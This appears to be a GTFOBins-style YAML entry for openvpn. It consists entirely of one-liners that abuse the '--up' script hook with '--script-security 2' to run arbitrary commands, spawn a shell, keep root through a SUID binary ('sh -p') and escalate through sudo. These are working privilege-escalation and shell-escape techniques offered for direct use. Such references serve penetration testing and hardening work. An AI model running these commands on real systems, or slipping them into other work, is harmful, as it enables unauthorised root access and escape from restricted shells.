---
functions:
  command:
    - code: |
        COMMAND='id'
        openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -c \"$COMMAND\""
  shell:
    - code: |
        openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -c sh"
  suid:
    - code: |
        COMMAND='id'
        openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -p -c \"$COMMAND\""
  sudo:
    - code: |
        COMMAND='id'
        sudo openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -c \"$COMMAND\""
---
